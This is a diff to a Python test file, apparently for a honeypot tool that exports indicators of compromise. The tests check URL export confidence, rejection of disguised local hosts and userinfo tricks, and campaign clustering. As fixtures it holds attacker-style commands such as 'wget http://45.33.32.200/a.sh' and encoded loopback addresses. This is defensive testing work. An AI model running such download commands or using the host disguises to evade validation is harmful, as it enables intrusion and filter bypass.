@@ -90,9 +90,11 @@ def test_export_lists_attempted_urls_at_lower_confidence_and_counts_sessions_onc
     db.commit()
     map_pending(db)
     now = T0 + timedelta(days=1)
-    indicators, _ = ioc.collect(db, now=now, filters=ioc.Filters(types=("url",)))
+    indicators, _ = ioc.collect(
+        db, now=now, filters=ioc.Filters(types=("url",), attempted_min_sources=1)
+    )
     by_url = {i.value: i for i in indicators}
-    assert by_url[URL].confidence == 50 and by_url[URL].sessions == 1
+    assert by_url[URL].confidence == 40 and by_url[URL].sessions == 1
     assert by_url["http://45.33.32.157/z"].confidence == 60
     assert by_url["http://45.33.32.157/z"].sessions == 1  # download and attempt: one session
 
@@ -111,3 +113,102 @@ def test_session_detail_lists_attempts(db):
     map_pending(db)
     detail = queries.session_detail(db, "s1")
     assert detail is not None and [a.url for a in detail.attempts] == [URL]
+
+
+# --- anyone can type any address: what must never reach an export ---------------------------
+
+
+def _urls(db, **kwargs):
+    now = T0 + timedelta(days=1)
+    indicators, summary = ioc.collect(db, now=now, filters=ioc.Filters(types=("url",), **kwargs))
+    return {i.value: i for i in indicators}, summary
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s http://ifconfig.me/ip",
+        "wget -qO- http://ipinfo.io/ip",
+        "curl https://www.google.com",
+        "wget http://8.8.8.8/x",
+        "curl https://api.ipify.org",
+    ],
+)
+def test_look_up_services_are_never_exported(db, command):
+    for n in range(4):  # even seen from many addresses
+        add(db, f"s{n}", f"80.66.76.{10 + n}", n, [command])
+    map_pending(db)
+    found, summary = _urls(db, attempted_min_sources=0)
+    assert found == {} and summary.common >= 1
+
+
+@pytest.mark.parametrize(
+    "host",
+    ["127.1", "2130706433", "0x7f000001", "0177.0.0.1", "router", "10.0.0.1.nip.io", "192.168.1.1"],
+)
+def test_disguised_local_hosts_are_not_valid(host):
+    assert not ioc.valid_url(f"http://{host}/x")
+
+
+def test_userinfo_tricks_are_not_valid():
+    assert not ioc.valid_url("http://evil.example@8.8.8.8/x")
+    assert ioc.valid_url("http://45.33.32.156/x") and ioc.valid_url("tftp://45.33.32.156/x")
+
+
+def test_a_typed_only_address_needs_several_different_sources(db):
+    add(db, "s1", "80.66.76.10", 0, ["wget http://45.33.32.200/a.sh"])
+    add(db, "s2", "80.66.76.10", 1, ["wget http://45.33.32.200/a.sh"])  # same source twice
+    map_pending(db)
+    found, summary = _urls(db)
+    assert found == {} and summary.unverified == 1
+    add(db, "s3", "80.66.76.11", 2, ["wget http://45.33.32.200/a.sh"])
+    add(db, "s4", "80.66.76.12", 3, ["wget http://45.33.32.200/a.sh"])
+    map_pending(db)
+    found, _ = _urls(db)
+    assert found["http://45.33.32.200/a.sh"].attempted is True
+
+
+def test_typed_only_addresses_are_labelled_unverified_in_stix_and_csv(db):
+    add(db, "s1", "80.66.76.10", 0, ["wget http://45.33.32.200/a.sh"])
+    map_pending(db)
+    now = T0 + timedelta(days=1)
+    filters = ioc.Filters(types=("url",), attempted_min_sources=1)
+    indicators, _ = ioc.collect(db, now=now, filters=filters)
+    stix = ioc.render(indicators, "stix", now=now, filters=filters, author="t")
+    assert "anomalous-activity" in stix and "malicious-activity" not in stix
+    assert "unverified" in stix
+    assert "never seen delivering" in ioc.render(
+        indicators, "csv", now=now, filters=filters, author="t"
+    )
+
+
+def test_exclude_and_internal_networks_apply_to_url_hosts(db, monkeypatch):
+    add(
+        db, "s1", "80.66.76.10", 0, ["wget http://45.33.32.200/a.sh", "wget http://45.33.40.1/b.sh"]
+    )
+    map_pending(db)
+    found, _ = _urls(db, attempted_min_sources=1, exclude=ioc.parse_networks(["45.33.32.0/24"]))
+    assert list(found) == ["http://45.33.40.1/b.sh"]
+    monkeypatch.setenv("INTERNAL_NETWORKS", "45.33.40.1")
+    found, _ = _urls(db, attempted_min_sources=1)
+    assert list(found) == ["http://45.33.32.200/a.sh"]
+
+
+def test_campaigns_ignore_look_up_services_and_shared_hosts():
+    def facts(sid, n, url):
+        return camp.SessionFacts(
+            id=sid, ip=f"80.66.76.{n}", start=T0 + timedelta(hours=n), urls={url}
+        )
+
+    recon = [facts("a", 1, "http://ifconfig.me/ip"), facts("b", 2, "http://ifconfig.me/ip")]
+    assert camp.cluster(recon) == []
+    one = [
+        facts("c", 3, "https://github.com/x/one.sh"),
+        facts("d", 4, "https://github.com/y/two.sh"),
+    ]
+    assert camp.cluster(one) == []  # same host, different files: nothing links them
+    same = [
+        facts("e", 5, "https://github.com/x/one.sh"),
+        facts("f", 6, "https://github.com/x/one.sh"),
+    ]
+    assert [sorted(c.session_ids) for c in camp.cluster(same)] == [["e", "f"]]
